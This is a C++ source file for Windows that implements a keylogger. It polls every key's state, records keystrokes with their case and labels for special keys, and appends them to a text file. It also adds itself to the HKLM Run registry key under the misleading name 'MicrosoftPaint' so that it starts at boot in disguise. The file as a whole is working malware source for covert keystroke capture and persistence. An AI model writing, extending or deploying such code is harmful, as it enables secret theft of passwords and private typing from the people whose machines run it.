#include "../Utils/keyboard.h"

bool isCapsLock() {
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
		return true;
	else
		return false;
}

bool isShift() {
	if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return true;
	else
		return false;
}




auto detectKey() {
	while (1)
	{
		for (DWORD press = 0x08; press <= 0xFE; press=press+0x1) {
			if (GetAsyncKeyState(press) & 0x8000) {
				std::this_thread::sleep_for(std::chrono::milliseconds(99));
				std::string aya(1, press);
				if (!(isShift() ^ isCapsLock())) {
				boost::algorithm::to_lower(aya);
				}
				switch (press) {
				case VK_SPACE:
					aya = "[Space]";
					break;
				case VK_SHIFT:
					aya = "[Shift]";
					break;
				case VK_RSHIFT:
					aya = "[RSHIFT]";
					break;
				case VK_RETURN:
					aya = "[Enter]";
					break;
				case VK_TAB:
					aya = "[TAB]";
					break;
				case VK_CONTROL:
					aya = "[CTRL]";
					break;
				case VK_DELETE:
					aya = "[DEL]";
					break;
				case VK_CAPITAL:
					aya = "[Caps Lock]";
					break;
				case VK_BACK:
					aya = "[Backspace]";
					break;
				}

				return aya;
			}
		}

	}
}

void saveInTextFile()
{
	std::ofstream myfile;
	while (true) {
		std::string key = detectKey();
		auto file = std::filesystem::path("output.txt").filename().string();
		myfile.open("output.txt",std::ofstream::app);
		myfile << key;
		myfile.close();
		if (GetSystemMetrics(SM_SHUTTINGDOWN)) {
			;
		}
	}
}

bool PersistantApplication() {
	HMODULE hModule = NULL;
	std::string reg;
	char Path[MAX_PATH];
	GetModuleFileNameA(hModule, Path, sizeof(Path));
	reg = Path;
	HKEY key;
	LONG regeditOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
	if (regeditOpen == ERROR_SUCCESS) {
		regeditOpen = RegSetValueEx(key, "MicrosoftPaint", 0, REG_SZ, (BYTE*)reg.c_str(), (reg.size() + 1) * sizeof(wchar_t));
		if (regeditOpen == ERROR_SUCCESS) {
			return true;
		}
		else {
			return false;
		}
	}
	else {
		return false;
	}
}